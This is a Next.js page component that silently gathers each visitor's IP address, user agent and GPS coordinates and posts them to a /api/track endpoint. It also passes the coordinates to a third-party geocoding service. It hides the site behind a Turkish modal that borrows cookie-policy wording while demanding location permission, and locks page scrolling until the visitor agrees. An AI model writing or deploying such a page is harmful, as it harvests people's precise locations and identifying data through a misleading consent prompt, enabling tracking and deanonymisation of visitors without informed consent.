import { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import styles from './Home.module.css'; // CSS module

export default function Home() {
  const router = useRouter();
  const [locationPermission, setLocationPermission] = useState(false);

  useEffect(() => {
    const fetchIP = async () => {
      const res = await fetch('https://api64.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    };

    const saveVisitData = async (data) => {
      await fetch('/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
    };

    const getUserData = async () => {
      const userAgent = navigator.userAgent;
      const ip = await fetchIP();
      
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          const res = await fetch(`https://geocode.xyz/${latitude},${longitude}?geoit=json`);
          const locationData = await res.json();

          const data = {
            latitude,
            longitude,
            country: locationData.country,
            city: locationData.city,
            device: navigator.userAgent,
            ip,
            userAgent,
          };

          await saveVisitData(data);
          setLocationPermission(true);
        }, async () => {
          const data = {
            ip,
            userAgent,
          };

          await saveVisitData(data);
          setLocationPermission(false);
        });
      } else {
        const data = {
          ip,
          userAgent,
        };

        await saveVisitData(data);
        setLocationPermission(false);
      }
    };

    getUserData();
  }, [router]);

  useEffect(() => {
    if (!locationPermission) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'auto';
    }
  }, [locationPermission]);

  const requestLocation = () => {
    navigator.geolocation.getCurrentPosition(
      () => setLocationPermission(true),
      () => setLocationPermission(false)
    );
  };

  return (
    <div className={styles.container}>
      <iframe src="/brs.html" className={styles.iframe}></iframe>
      {!locationPermission && (
        <div className={styles.overlay}>
          <div className={styles.modal}>
            <p className={styles.message}>
              Çerezlere ilişkin detaylı bilgiye Çerez Politikası’ndan ulaşabilirsiniz. “Çerez Ayarlarını Yapılandır” bölümünden tercihlerinizi yönetebilirsiniz.
            </p>
            <p className={styles.message}>
              Bu siteyi görüntülemek için konum izni vermeniz gerekmektedir.
            </p>
            <button className={styles.button} onClick={requestLocation}>
              Kabul et
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
